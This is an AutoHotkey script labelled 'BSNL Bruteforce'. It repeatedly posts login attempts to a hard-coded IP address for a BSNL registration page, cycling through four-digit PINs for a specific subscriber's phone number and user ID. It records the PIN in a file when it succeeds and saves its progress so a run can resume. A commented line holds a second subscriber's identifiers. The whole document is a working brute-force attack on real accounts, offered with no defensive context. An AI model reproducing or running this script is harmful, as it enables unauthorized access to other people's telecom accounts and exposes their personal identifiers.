#SingleInstance ignore
#noenv 
OnExit, ExitMe

html     := "" 
URL      := "http://210.212.237.102/register/logcheck.php" 

IniRead, passwd, Bruteforce.ini, Main, passwd, 1541
progress,A R1000-9999,Starting..,Progress,BSNL Bruteforce
Loop
{
Progress,%passwd%,%passwd%
POSTData := "ssa=KTM:KOTTAYAM&sstd=0481&phone_no=2577005&uid=91299252&passwd=" . passwd 
;POSTData := "ssa=KTM:KOTTAYAM&sstd=04828&phone_no=206019&uid=88362403&passwd=1111" 
length := httpQuery(html,URL,POSTdata) 
varSetCapacity(html,-1) 
if length < 10
 {
  Sleep 2000
  Continue
 }  
IfInString, html, Details
  {
   FileAppend, The correct pin is %passwd%, passwd.txt
   MsgBox, 64, BSNL Bruteforce, Password found!!`n`n Password is %passwd%., 5
   ExitApp
  }
passwd++
if passwd > 9999
  ExitApp
}


ExitMe:
passwd--
IniWrite,%passwd%,Bruteforce.ini,Main,passwd
ExitApp
Return